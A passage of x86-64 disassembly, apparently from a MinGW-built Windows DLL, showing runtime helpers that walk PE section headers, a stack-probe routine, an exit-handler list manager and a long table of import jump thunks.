    6968bfd1:	75 e2                	jne    0x6968bfb5
    6968bfd3:	48 89 d8             	mov    %rbx,%rax
    6968bfd6:	48 83 c4 20          	add    $0x20,%rsp
    6968bfda:	5b                   	pop    %rbx
    6968bfdb:	5e                   	pop    %rsi
    6968bfdc:	5f                   	pop    %rdi
    6968bfdd:	c3                   	ret
    6968bfde:	66 90                	xchg   %ax,%ax
    6968bfe0:	31 db                	xor    %ebx,%ebx
    6968bfe2:	48 89 d8             	mov    %rbx,%rax
    6968bfe5:	48 83 c4 20          	add    $0x20,%rsp
    6968bfe9:	5b                   	pop    %rbx
    6968bfea:	5e                   	pop    %rsi
    6968bfeb:	5f                   	pop    %rdi
    6968bfec:	c3                   	ret
    6968bfed:	0f 1f 00             	nopl   (%rax)
    6968bff0:	48 83 ec 28          	sub    $0x28,%rsp
    6968bff4:	4c 8b 05 b5 9a 0e 00 	mov    0xe9ab5(%rip),%r8        # 0x69775ab0
    6968bffb:	66 41 81 38 4d 5a    	cmpw   $0x5a4d,(%r8)
    6968c001:	48 89 ca             	mov    %rcx,%rdx
    6968c004:	75 57                	jne    0x6968c05d
    6968c006:	4c 89 c1             	mov    %r8,%rcx
    6968c009:	e8 c2 fe ff ff       	call   0x6968bed0
    6968c00e:	85 c0                	test   %eax,%eax
    6968c010:	74 4b                	je     0x6968c05d
    6968c012:	49 63 40 3c          	movslq 0x3c(%r8),%rax
    6968c016:	48 89 d1             	mov    %rdx,%rcx
    6968c019:	4c 29 c1             	sub    %r8,%rcx
    6968c01c:	49 01 c0             	add    %rax,%r8
    6968c01f:	41 0f b7 50 06       	movzwl 0x6(%r8),%edx
    6968c024:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
    6968c029:	85 d2                	test   %edx,%edx
    6968c02b:	49 8d 44 00 18       	lea    0x18(%r8,%rax,1),%rax
    6968c030:	74 2b                	je     0x6968c05d
    6968c032:	83 ea 01             	sub    $0x1,%edx
    6968c035:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
    6968c039:	4c 8d 4c d0 28       	lea    0x28(%rax,%rdx,8),%r9
    6968c03e:	66 90                	xchg   %ax,%ax
    6968c040:	44 8b 40 0c          	mov    0xc(%rax),%r8d
    6968c044:	4c 39 c1             	cmp    %r8,%rcx
    6968c047:	4c 89 c2             	mov    %r8,%rdx
    6968c04a:	72 08                	jb     0x6968c054
    6968c04c:	03 50 08             	add    0x8(%rax),%edx
    6968c04f:	48 39 d1             	cmp    %rdx,%rcx
    6968c052:	72 0b                	jb     0x6968c05f
    6968c054:	48 83 c0 28          	add    $0x28,%rax
    6968c058:	4c 39 c8             	cmp    %r9,%rax
    6968c05b:	75 e3                	jne    0x6968c040
    6968c05d:	31 c0                	xor    %eax,%eax
    6968c05f:	48 83 c4 28          	add    $0x28,%rsp
    6968c063:	c3                   	ret
    6968c064:	66 90                	xchg   %ax,%ax
    6968c066:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    6968c06d:	00 00 00 
    6968c070:	48 83 ec 28          	sub    $0x28,%rsp
    6968c074:	48 8b 15 35 9a 0e 00 	mov    0xe9a35(%rip),%rdx        # 0x69775ab0
    6968c07b:	45 31 c0             	xor    %r8d,%r8d
    6968c07e:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
    6968c083:	74 0b                	je     0x6968c090
    6968c085:	44 89 c0             	mov    %r8d,%eax
    6968c088:	48 83 c4 28          	add    $0x28,%rsp
    6968c08c:	c3                   	ret
    6968c08d:	0f 1f 00             	nopl   (%rax)
    6968c090:	48 89 d1             	mov    %rdx,%rcx
    6968c093:	e8 38 fe ff ff       	call   0x6968bed0
    6968c098:	85 c0                	test   %eax,%eax
    6968c09a:	74 e9                	je     0x6968c085
    6968c09c:	48 63 42 3c          	movslq 0x3c(%rdx),%rax
    6968c0a0:	44 0f b7 44 10 06    	movzwl 0x6(%rax,%rdx,1),%r8d
    6968c0a6:	44 89 c0             	mov    %r8d,%eax
    6968c0a9:	48 83 c4 28          	add    $0x28,%rsp
    6968c0ad:	c3                   	ret
    6968c0ae:	66 90                	xchg   %ax,%ax
    6968c0b0:	48 83 ec 28          	sub    $0x28,%rsp
    6968c0b4:	4c 8b 05 f5 99 0e 00 	mov    0xe99f5(%rip),%r8        # 0x69775ab0
    6968c0bb:	66 41 81 38 4d 5a    	cmpw   $0x5a4d,(%r8)
    6968c0c1:	48 89 ca             	mov    %rcx,%rdx
    6968c0c4:	75 52                	jne    0x6968c118
    6968c0c6:	4c 89 c1             	mov    %r8,%rcx
    6968c0c9:	e8 02 fe ff ff       	call   0x6968bed0
    6968c0ce:	85 c0                	test   %eax,%eax
    6968c0d0:	74 46                	je     0x6968c118
    6968c0d2:	49 63 48 3c          	movslq 0x3c(%r8),%rcx
    6968c0d6:	4c 01 c1             	add    %r8,%rcx
    6968c0d9:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
    6968c0dd:	48 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%rax
    6968c0e2:	0f b7 49 06          	movzwl 0x6(%rcx),%ecx
    6968c0e6:	85 c9                	test   %ecx,%ecx
    6968c0e8:	74 2e                	je     0x6968c118
    6968c0ea:	83 e9 01             	sub    $0x1,%ecx
    6968c0ed:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
    6968c0f1:	48 8d 4c c8 28       	lea    0x28(%rax,%rcx,8),%rcx
    6968c0f6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    6968c0fd:	00 00 00 
    6968c100:	f6 40 27 20          	testb  $0x20,0x27(%rax)
    6968c104:	74 09                	je     0x6968c10f
    6968c106:	48 85 d2             	test   %rdx,%rdx
    6968c109:	74 0f                	je     0x6968c11a
    6968c10b:	48 83 ea 01          	sub    $0x1,%rdx
    6968c10f:	48 83 c0 28          	add    $0x28,%rax
    6968c113:	48 39 c8             	cmp    %rcx,%rax
    6968c116:	75 e8                	jne    0x6968c100
    6968c118:	31 c0                	xor    %eax,%eax
    6968c11a:	48 83 c4 28          	add    $0x28,%rsp
    6968c11e:	c3                   	ret
    6968c11f:	90                   	nop
    6968c120:	48 83 ec 28          	sub    $0x28,%rsp
    6968c124:	48 8b 15 85 99 0e 00 	mov    0xe9985(%rip),%rdx        # 0x69775ab0
    6968c12b:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
    6968c130:	75 1e                	jne    0x6968c150
    6968c132:	48 89 d1             	mov    %rdx,%rcx
    6968c135:	e8 96 fd ff ff       	call   0x6968bed0
    6968c13a:	85 c0                	test   %eax,%eax
    6968c13c:	b8 00 00 00 00       	mov    $0x0,%eax
    6968c141:	48 0f 45 c2          	cmovne %rdx,%rax
    6968c145:	48 83 c4 28          	add    $0x28,%rsp
    6968c149:	c3                   	ret
    6968c14a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    6968c150:	31 c0                	xor    %eax,%eax
    6968c152:	48 83 c4 28          	add    $0x28,%rsp
    6968c156:	c3                   	ret
    6968c157:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    6968c15e:	00 00 
    6968c160:	48 83 ec 28          	sub    $0x28,%rsp
    6968c164:	4c 8b 05 45 99 0e 00 	mov    0xe9945(%rip),%r8        # 0x69775ab0
    6968c16b:	31 c0                	xor    %eax,%eax
    6968c16d:	66 41 81 38 4d 5a    	cmpw   $0x5a4d,(%r8)
    6968c173:	48 89 ca             	mov    %rcx,%rdx
    6968c176:	74 08                	je     0x6968c180
    6968c178:	48 83 c4 28          	add    $0x28,%rsp
    6968c17c:	c3                   	ret
    6968c17d:	0f 1f 00             	nopl   (%rax)
    6968c180:	4c 89 c1             	mov    %r8,%rcx
    6968c183:	e8 48 fd ff ff       	call   0x6968bed0
    6968c188:	85 c0                	test   %eax,%eax
    6968c18a:	74 ec                	je     0x6968c178
    6968c18c:	49 63 40 3c          	movslq 0x3c(%r8),%rax
    6968c190:	48 89 d1             	mov    %rdx,%rcx
    6968c193:	4c 29 c1             	sub    %r8,%rcx
    6968c196:	49 01 c0             	add    %rax,%r8
    6968c199:	41 0f b7 50 06       	movzwl 0x6(%r8),%edx
    6968c19e:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
    6968c1a3:	85 d2                	test   %edx,%edx
    6968c1a5:	49 8d 44 00 18       	lea    0x18(%r8,%rax,1),%rax
    6968c1aa:	74 31                	je     0x6968c1dd
    6968c1ac:	83 ea 01             	sub    $0x1,%edx
    6968c1af:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
    6968c1b3:	4c 8d 4c d0 28       	lea    0x28(%rax,%rdx,8),%r9
    6968c1b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    6968c1bf:	00 
    6968c1c0:	44 8b 40 0c          	mov    0xc(%rax),%r8d
    6968c1c4:	4c 39 c1             	cmp    %r8,%rcx
    6968c1c7:	4c 89 c2             	mov    %r8,%rdx
    6968c1ca:	72 08                	jb     0x6968c1d4
    6968c1cc:	03 50 08             	add    0x8(%rax),%edx
    6968c1cf:	48 39 d1             	cmp    %rdx,%rcx
    6968c1d2:	72 10                	jb     0x6968c1e4
    6968c1d4:	48 83 c0 28          	add    $0x28,%rax
    6968c1d8:	4c 39 c8             	cmp    %r9,%rax
    6968c1db:	75 e3                	jne    0x6968c1c0
    6968c1dd:	31 c0                	xor    %eax,%eax
    6968c1df:	48 83 c4 28          	add    $0x28,%rsp
    6968c1e3:	c3                   	ret
    6968c1e4:	8b 40 24             	mov    0x24(%rax),%eax
    6968c1e7:	f7 d0                	not    %eax
    6968c1e9:	c1 e8 1f             	shr    $0x1f,%eax
    6968c1ec:	48 83 c4 28          	add    $0x28,%rsp
    6968c1f0:	c3                   	ret
    6968c1f1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    6968c1f6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    6968c1fd:	00 00 00 
    6968c200:	48 83 ec 28          	sub    $0x28,%rsp
    6968c204:	4c 8b 1d a5 98 0e 00 	mov    0xe98a5(%rip),%r11        # 0x69775ab0
    6968c20b:	66 41 81 3b 4d 5a    	cmpw   $0x5a4d,(%r11)
    6968c211:	41 89 c9             	mov    %ecx,%r9d
    6968c214:	75 58                	jne    0x6968c26e
    6968c216:	4c 89 d9             	mov    %r11,%rcx
    6968c219:	e8 b2 fc ff ff       	call   0x6968bed0
    6968c21e:	85 c0                	test   %eax,%eax
    6968c220:	74 4c                	je     0x6968c26e
    6968c222:	49 63 43 3c          	movslq 0x3c(%r11),%rax
    6968c226:	4c 01 d8             	add    %r11,%rax
    6968c229:	8b 90 90 00 00 00    	mov    0x90(%rax),%edx
    6968c22f:	85 d2                	test   %edx,%edx
    6968c231:	74 3b                	je     0x6968c26e
    6968c233:	0f b7 48 14          	movzwl 0x14(%rax),%ecx
    6968c237:	48 8d 4c 08 18       	lea    0x18(%rax,%rcx,1),%rcx
    6968c23c:	0f b7 40 06          	movzwl 0x6(%rax),%eax
    6968c240:	85 c0                	test   %eax,%eax
    6968c242:	74 2a                	je     0x6968c26e
    6968c244:	83 e8 01             	sub    $0x1,%eax
    6968c247:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
    6968c24b:	48 8d 44 c1 28       	lea    0x28(%rcx,%rax,8),%rax
    6968c250:	44 8b 51 0c          	mov    0xc(%rcx),%r10d
    6968c254:	4c 39 d2             	cmp    %r10,%rdx
    6968c257:	4d 89 d0             	mov    %r10,%r8
    6968c25a:	72 09                	jb     0x6968c265
    6968c25c:	44 03 41 08          	add    0x8(%rcx),%r8d
    6968c260:	4c 39 c2             	cmp    %r8,%rdx
    6968c263:	72 10                	jb     0x6968c275
    6968c265:	48 83 c1 28          	add    $0x28,%rcx
    6968c269:	48 39 c1             	cmp    %rax,%rcx
    6968c26c:	75 e2                	jne    0x6968c250
    6968c26e:	31 c0                	xor    %eax,%eax
    6968c270:	48 83 c4 28          	add    $0x28,%rsp
    6968c274:	c3                   	ret
    6968c275:	4c 01 da             	add    %r11,%rdx
    6968c278:	75 0e                	jne    0x6968c288
    6968c27a:	eb f2                	jmp    0x6968c26e
    6968c27c:	0f 1f 40 00          	nopl   0x0(%rax)
    6968c280:	41 83 e9 01          	sub    $0x1,%r9d
    6968c284:	48 83 c2 14          	add    $0x14,%rdx
    6968c288:	8b 4a 04             	mov    0x4(%rdx),%ecx
    6968c28b:	85 c9                	test   %ecx,%ecx
    6968c28d:	75 07                	jne    0x6968c296
    6968c28f:	8b 42 0c             	mov    0xc(%rdx),%eax
    6968c292:	85 c0                	test   %eax,%eax
    6968c294:	74 d8                	je     0x6968c26e
    6968c296:	45 85 c9             	test   %r9d,%r9d
    6968c299:	7f e5                	jg     0x6968c280
    6968c29b:	8b 42 0c             	mov    0xc(%rdx),%eax
    6968c29e:	4c 01 d8             	add    %r11,%rax
    6968c2a1:	48 83 c4 28          	add    $0x28,%rsp
    6968c2a5:	c3                   	ret
    6968c2a6:	90                   	nop
    6968c2a7:	90                   	nop
    6968c2a8:	90                   	nop
    6968c2a9:	90                   	nop
    6968c2aa:	90                   	nop
    6968c2ab:	90                   	nop
    6968c2ac:	90                   	nop
    6968c2ad:	90                   	nop
    6968c2ae:	90                   	nop
    6968c2af:	90                   	nop
    6968c2b0:	db e3                	fninit
    6968c2b2:	c3                   	ret
    6968c2b3:	90                   	nop
    6968c2b4:	90                   	nop
    6968c2b5:	90                   	nop
    6968c2b6:	90                   	nop
    6968c2b7:	90                   	nop
    6968c2b8:	90                   	nop
    6968c2b9:	90                   	nop
    6968c2ba:	90                   	nop
    6968c2bb:	90                   	nop
    6968c2bc:	90                   	nop
    6968c2bd:	90                   	nop
    6968c2be:	90                   	nop
    6968c2bf:	90                   	nop
    6968c2c0:	51                   	push   %rcx
    6968c2c1:	50                   	push   %rax
    6968c2c2:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
    6968c2c8:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
    6968c2cd:	72 19                	jb     0x6968c2e8
    6968c2cf:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
    6968c2d6:	48 83 09 00          	orq    $0x0,(%rcx)
    6968c2da:	48 2d 00 10 00 00    	sub    $0x1000,%rax
    6968c2e0:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
    6968c2e6:	77 e7                	ja     0x6968c2cf
    6968c2e8:	48 29 c1             	sub    %rax,%rcx
    6968c2eb:	48 83 09 00          	orq    $0x0,(%rcx)
    6968c2ef:	58                   	pop    %rax
    6968c2f0:	59                   	pop    %rcx
    6968c2f1:	c3                   	ret
    6968c2f2:	90                   	nop
    6968c2f3:	90                   	nop
    6968c2f4:	90                   	nop
    6968c2f5:	90                   	nop
    6968c2f6:	90                   	nop
    6968c2f7:	90                   	nop
    6968c2f8:	90                   	nop
    6968c2f9:	90                   	nop
    6968c2fa:	90                   	nop
    6968c2fb:	90                   	nop
    6968c2fc:	90                   	nop
    6968c2fd:	90                   	nop
    6968c2fe:	90                   	nop
    6968c2ff:	90                   	nop
    6968c300:	b8 01 00 00 00       	mov    $0x1,%eax
    6968c305:	c3                   	ret
    6968c306:	90                   	nop
    6968c307:	90                   	nop
    6968c308:	90                   	nop
    6968c309:	90                   	nop
    6968c30a:	90                   	nop
    6968c30b:	90                   	nop
    6968c30c:	90                   	nop
    6968c30d:	90                   	nop
    6968c30e:	90                   	nop
    6968c30f:	90                   	nop
    6968c310:	48 8d 44 24 08       	lea    0x8(%rsp),%rax
    6968c315:	c3                   	ret
    6968c316:	48 8d 05 27 20 10 00 	lea    0x102027(%rip),%rax        # 0x6978e344
    6968c31d:	ff 20                	jmp    *(%rax)
    6968c31f:	90                   	nop
    6968c320:	ff 25 66 20 10 00    	jmp    *0x102066(%rip)        # 0x6978e38c
    6968c326:	90                   	nop
    6968c327:	90                   	nop
    6968c328:	ff 25 4e 20 10 00    	jmp    *0x10204e(%rip)        # 0x6978e37c
    6968c32e:	90                   	nop
    6968c32f:	90                   	nop
    6968c330:	ff 25 3e 20 10 00    	jmp    *0x10203e(%rip)        # 0x6978e374
    6968c336:	90                   	nop
    6968c337:	90                   	nop
    6968c338:	ff 25 26 20 10 00    	jmp    *0x102026(%rip)        # 0x6978e364
    6968c33e:	90                   	nop
    6968c33f:	90                   	nop
    6968c340:	ff 25 f6 1f 10 00    	jmp    *0x101ff6(%rip)        # 0x6978e33c
    6968c346:	90                   	nop
    6968c347:	90                   	nop
    6968c348:	ff 25 e6 1f 10 00    	jmp    *0x101fe6(%rip)        # 0x6978e334
    6968c34e:	90                   	nop
    6968c34f:	90                   	nop
    6968c350:	ff 25 c6 1f 10 00    	jmp    *0x101fc6(%rip)        # 0x6978e31c
    6968c356:	90                   	nop
    6968c357:	90                   	nop
    6968c358:	ff 25 ae 1f 10 00    	jmp    *0x101fae(%rip)        # 0x6978e30c
    6968c35e:	90                   	nop
    6968c35f:	90                   	nop
    6968c360:	ff 25 9e 1f 10 00    	jmp    *0x101f9e(%rip)        # 0x6978e304
    6968c366:	90                   	nop
    6968c367:	90                   	nop
    6968c368:	ff 25 86 1f 10 00    	jmp    *0x101f86(%rip)        # 0x6978e2f4
    6968c36e:	90                   	nop
    6968c36f:	90                   	nop
    6968c370:	ff 25 76 1f 10 00    	jmp    *0x101f76(%rip)        # 0x6978e2ec
    6968c376:	90                   	nop
    6968c377:	90                   	nop
    6968c378:	ff 25 5e 1f 10 00    	jmp    *0x101f5e(%rip)        # 0x6978e2dc
    6968c37e:	90                   	nop
    6968c37f:	90                   	nop
    6968c380:	ff 25 4e 1f 10 00    	jmp    *0x101f4e(%rip)        # 0x6978e2d4
    6968c386:	90                   	nop
    6968c387:	90                   	nop
    6968c388:	ff 25 3e 1f 10 00    	jmp    *0x101f3e(%rip)        # 0x6978e2cc
    6968c38e:	90                   	nop
    6968c38f:	90                   	nop
    6968c390:	48 85 c9             	test   %rcx,%rcx
    6968c393:	74 1a                	je     0x6968c3af
    6968c395:	31 c0                	xor    %eax,%eax
    6968c397:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
    6968c39e:	00 
    6968c39f:	48 c7 41 08 00 00 00 	movq   $0x0,0x8(%rcx)
    6968c3a6:	00 
    6968c3a7:	48 c7 01 00 00 00 00 	movq   $0x0,(%rcx)
    6968c3ae:	c3                   	ret
    6968c3af:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    6968c3b4:	c3                   	ret
    6968c3b5:	90                   	nop
    6968c3b6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    6968c3bd:	00 00 00 
    6968c3c0:	55                   	push   %rbp
    6968c3c1:	57                   	push   %rdi
    6968c3c2:	56                   	push   %rsi
    6968c3c3:	53                   	push   %rbx
    6968c3c4:	48 83 ec 28          	sub    $0x28,%rsp
    6968c3c8:	48 85 c9             	test   %rcx,%rcx
    6968c3cb:	48 89 cb             	mov    %rcx,%rbx
    6968c3ce:	48 89 d7             	mov    %rdx,%rdi
    6968c3d1:	0f 84 99 00 00 00    	je     0x6968c470
    6968c3d7:	b9 08 00 00 00       	mov    $0x8,%ecx
    6968c3dc:	e8 4f 01 00 00       	call   0x6968c530
    6968c3e1:	48 83 3b 00          	cmpq   $0x0,(%rbx)
    6968c3e5:	74 5d                	je     0x6968c444
    6968c3e7:	48 8b 73 08          	mov    0x8(%rbx),%rsi
    6968c3eb:	48 8b 43 10          	mov    0x10(%rbx),%rax
    6968c3ef:	48 39 f0             	cmp    %rsi,%rax
    6968c3f2:	74 20                	je     0x6968c414
    6968c3f4:	48 8d 46 08          	lea    0x8(%rsi),%rax
    6968c3f8:	b9 08 00 00 00       	mov    $0x8,%ecx
    6968c3fd:	48 89 43 08          	mov    %rax,0x8(%rbx)
    6968c401:	48 89 3e             	mov    %rdi,(%rsi)
    6968c404:	e8 1f 01 00 00       	call   0x6968c528
    6968c409:	31 c0                	xor    %eax,%eax
    6968c40b:	48 83 c4 28          	add    $0x28,%rsp
    6968c40f:	5b                   	pop    %rbx
    6968c410:	5e                   	pop    %rsi
    6968c411:	5f                   	pop    %rdi
    6968c412:	5d                   	pop    %rbp
    6968c413:	c3                   	ret
    6968c414:	48 8b 0b             	mov    (%rbx),%rcx
    6968c417:	48 29 ce             	sub    %rcx,%rsi
    6968c41a:	48 89 f0             	mov    %rsi,%rax
    6968c41d:	48 c1 f8 03          	sar    $0x3,%rax
    6968c421:	48 c1 e0 04          	shl    $0x4,%rax
    6968c425:	48 89 c2             	mov    %rax,%rdx
    6968c428:	48 89 c5             	mov    %rax,%rbp
    6968c42b:	e8 f0 00 00 00       	call   0x6968c520
    6968c430:	48 85 c0             	test   %rax,%rax
    6968c433:	74 42                	je     0x6968c477
    6968c435:	48 89 03             	mov    %rax,(%rbx)
    6968c438:	48 01 c6             	add    %rax,%rsi
    6968c43b:	48 01 e8             	add    %rbp,%rax
    6968c43e:	48 89 43 10          	mov    %rax,0x10(%rbx)
    6968c442:	eb b0                	jmp    0x6968c3f4
    6968c444:	ba 08 00 00 00       	mov    $0x8,%edx
    6968c449:	b9 20 00 00 00       	mov    $0x20,%ecx
    6968c44e:	e8 05 ff ff ff       	call   0x6968c358
    6968c453:	48 85 c0             	test   %rax,%rax
    6968c456:	48 89 c6             	mov    %rax,%rsi
    6968c459:	48 89 03             	mov    %rax,(%rbx)
    6968c45c:	74 19                	je     0x6968c477
    6968c45e:	48 89 43 08          	mov    %rax,0x8(%rbx)
    6968c462:	48 8d 80 00 01 00 00 	lea    0x100(%rax),%rax
    6968c469:	48 89 43 10          	mov    %rax,0x10(%rbx)
    6968c46d:	eb 80                	jmp    0x6968c3ef
    6968c46f:	90                   	nop
    6968c470:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    6968c475:	eb 94                	jmp    0x6968c40b
    6968c477:	b9 08 00 00 00       	mov    $0x8,%ecx
    6968c47c:	e8 a7 00 00 00       	call   0x6968c528
    6968c481:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    6968c486:	eb 83                	jmp    0x6968c40b
    6968c488:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    6968c48f:	00 
    6968c490:	57                   	push   %rdi
    6968c491:	56                   	push   %rsi
    6968c492:	53                   	push   %rbx
    6968c493:	48 83 ec 20          	sub    $0x20,%rsp
    6968c497:	48 89 cf             	mov    %rcx,%rdi
    6968c49a:	b9 08 00 00 00       	mov    $0x8,%ecx
    6968c49f:	e8 8c 00 00 00       	call   0x6968c530
    6968c4a4:	48 8b 37             	mov    (%rdi),%rsi
    6968c4a7:	b9 08 00 00 00       	mov    $0x8,%ecx
    6968c4ac:	48 c7 47 10 00 00 00 	movq   $0x0,0x10(%rdi)
    6968c4b3:	00 
    6968c4b4:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
    6968c4b8:	48 c7 07 00 00 00 00 	movq   $0x0,(%rdi)
    6968c4bf:	48 c7 47 08 00 00 00 	movq   $0x0,0x8(%rdi)
    6968c4c6:	00 
    6968c4c7:	e8 5c 00 00 00       	call   0x6968c528
    6968c4cc:	48 85 f6             	test   %rsi,%rsi
    6968c4cf:	74 24                	je     0x6968c4f5
    6968c4d1:	48 83 eb 08          	sub    $0x8,%rbx
    6968c4d5:	48 39 de             	cmp    %rbx,%rsi
    6968c4d8:	77 13                	ja     0x6968c4ed
    6968c4da:	48 8b 03             	mov    (%rbx),%rax
    6968c4dd:	48 85 c0             	test   %rax,%rax
    6968c4e0:	74 ef                	je     0x6968c4d1
    6968c4e2:	ff d0                	call   *%rax
    6968c4e4:	48 83 eb 08          	sub    $0x8,%rbx
    6968c4e8:	48 39 de             	cmp    %rbx,%rsi
    6968c4eb:	76 ed                	jbe    0x6968c4da
    6968c4ed:	48 89 f1             	mov    %rsi,%rcx
    6968c4f0:	e8 53 fe ff ff       	call   0x6968c348
    6968c4f5:	31 c0                	xor    %eax,%eax
    6968c4f7:	48 83 c4 20          	add    $0x20,%rsp
    6968c4fb:	5b                   	pop    %rbx
    6968c4fc:	5e                   	pop    %rsi
    6968c4fd:	5f                   	pop    %rdi
    6968c4fe:	c3                   	ret
    6968c4ff:	90                   	nop
    6968c500:	53                   	push   %rbx
    6968c501:	48 83 ec 20          	sub    $0x20,%rsp
    6968c505:	89 cb                	mov    %ecx,%ebx
    6968c507:	e8 2c 00 00 00       	call   0x6968c538
    6968c50c:	89 d9                	mov    %ebx,%ecx
    6968c50e:	48 8d 14 49          	lea    (%rcx,%rcx,2),%rdx
    6968c512:	48 c1 e2 04          	shl    $0x4,%rdx
    6968c516:	48 01 d0             	add    %rdx,%rax
    6968c519:	48 83 c4 20          	add    $0x20,%rsp
    6968c51d:	5b                   	pop    %rbx
    6968c51e:	c3                   	ret
    6968c51f:	90                   	nop
    6968c520:	ff 25 36 1e 10 00    	jmp    *0x101e36(%rip)        # 0x6978e35c
    6968c526:	90                   	nop
    6968c527:	90                   	nop
    6968c528:	ff 25 ce 1d 10 00    	jmp    *0x101dce(%rip)        # 0x6978e2fc
    6968c52e:	90                   	nop
    6968c52f:	90                   	nop
    6968c530:	ff 25 ae 1d 10 00    	jmp    *0x101dae(%rip)        # 0x6978e2e4
    6968c536:	90                   	nop
    6968c537:	90                   	nop
    6968c538:	ff 25 86 1d 10 00    	jmp    *0x101d86(%rip)        # 0x6978e2c4
    6968c53e:	90                   	nop
    6968c53f:	90                   	nop
    6968c540:	ff 25 6e 1d 10 00    	jmp    *0x101d6e(%rip)        # 0x6978e2b4
    6968c546:	90                   	nop
    6968c547:	90                   	nop
    6968c548:	ff 25 5e 1d 10 00    	jmp    *0x101d5e(%rip)        # 0x6978e2ac
    6968c54e:	90                   	nop
    6968c54f:	90                   	nop
    6968c550:	ff 25 4e 1d 10 00    	jmp    *0x101d4e(%rip)        # 0x6978e2a4
    6968c556:	90                   	nop
    6968c557:	90                   	nop
    6968c558:	ff 25 3e 1d 10 00    	jmp    *0x101d3e(%rip)        # 0x6978e29c
    6968c55e:	90                   	nop
    6968c55f:	90                   	nop
    6968c560:	ff 25 2e 1d 10 00    	jmp    *0x101d2e(%rip)        # 0x6978e294
    6968c566:	90                   	nop
    6968c567:	90                   	nop
    6968c568:	ff 25 1e 1d 10 00    	jmp    *0x101d1e(%rip)        # 0x6978e28c
    6968c56e:	90                   	nop
    6968c56f:	90                   	nop
    6968c570:	ff 25 0e 1d 10 00    	jmp    *0x101d0e(%rip)        # 0x6978e284
    6968c576:	90                   	nop
    6968c577:	90                   	nop
    6968c578:	ff 25 fe 1c 10 00    	jmp    *0x101cfe(%rip)        # 0x6978e27c
    6968c57e:	90                   	nop
    6968c57f:	90                   	nop
    6968c580:	ff 25 ee 1c 10 00    	jmp    *0x101cee(%rip)        # 0x6978e274
    6968c586:	90                   	nop
    6968c587:	90                   	nop
    6968c588:	ff 25 de 1c 10 00    	jmp    *0x101cde(%rip)        # 0x6978e26c
    6968c58e:	90                   	nop
    6968c58f:	90                   	nop
    6968c590:	ff 25 ce 1c 10 00    	jmp    *0x101cce(%rip)        # 0x6978e264
    6968c596:	90                   	nop
    6968c597:	90                   	nop
    6968c598:	ff 25 be 1c 10 00    	jmp    *0x101cbe(%rip)        # 0x6978e25c
    6968c59e:	90                   	nop
    6968c59f:	90                   	nop
    6968c5a0:	ff 25 ae 1c 10 00    	jmp    *0x101cae(%rip)        # 0x6978e254
    6968c5a6:	90                   	nop
    6968c5a7:	90                   	nop
    6968c5a8:	ff 25 9e 1c 10 00    	jmp    *0x101c9e(%rip)        # 0x6978e24c
    6968c5ae:	90                   	nop
    6968c5af:	90                   	nop
    6968c5b0:	ff 25 8e 1c 10 00    	jmp    *0x101c8e(%rip)        # 0x6978e244
    6968c5b6:	90                   	nop
    6968c5b7:	90                   	nop
    6968c5b8:	ff 25 7e 1c 10 00    	jmp    *0x101c7e(%rip)        # 0x6978e23c
    6968c5be:	90                   	nop
    6968c5bf:	90                   	nop
    6968c5c0:	ff 25 6e 1c 10 00    	jmp    *0x101c6e(%rip)        # 0x6978e234
    6968c5c6:	90                   	nop
    6968c5c7:	90                   	nop
    6968c5c8:	ff 25 5e 1c 10 00    	jmp    *0x101c5e(%rip)        # 0x6978e22c
    6968c5ce:	90                   	nop
    6968c5cf:	90                   	nop
    6968c5d0:	ff 25 4e 1c 10 00    	jmp    *0x101c4e(%rip)        # 0x6978e224
    6968c5d6:	90                   	nop
    6968c5d7:	90                   	nop
    6968c5d8:	ff 25 3e 1c 10 00    	jmp    *0x101c3e(%rip)        # 0x6978e21c
    6968c5de:	90                   	nop
    6968c5df:	90                   	nop
    6968c5e0:	ff 25 2e 1c 10 00    	jmp    *0x101c2e(%rip)        # 0x6978e214
    6968c5e6:	90                   	nop
    6968c5e7:	90                   	nop
    6968c5e8:	ff 25 1e 1c 10 00    	jmp    *0x101c1e(%rip)        # 0x6978e20c
    6968c5ee:	90                   	nop
    6968c5ef:	90                   	nop
    6968c5f0:	ff 25 0e 1c 10 00    	jmp    *0x101c0e(%rip)        # 0x6978e204
    6968c5f6:	90                   	nop
    6968c5f7:	90                   	nop
    6968c5f8:	ff 25 fe 1b 10 00    	jmp    *0x101bfe(%rip)        # 0x6978e1fc
    6968c5fe:	90                   	nop
    6968c5ff:	90                   	nop
    6968c600:	ff 25 ee 1b 10 00    	jmp    *0x101bee(%rip)        # 0x6978e1f4
    6968c606:	90                   	nop
    6968c607:	90                   	nop
    6968c608:	ff 25 de 1b 10 00    	jmp    *0x101bde(%rip)        # 0x6978e1ec
    6968c60e:	90                   	nop
    6968c60f:	90                   	nop
    6968c610:	ff 25 6e 1d 10 00    	jmp    *0x101d6e(%rip)        # 0x6978e384
    6968c616:	90                   	nop
    6968c617:	90                   	nop
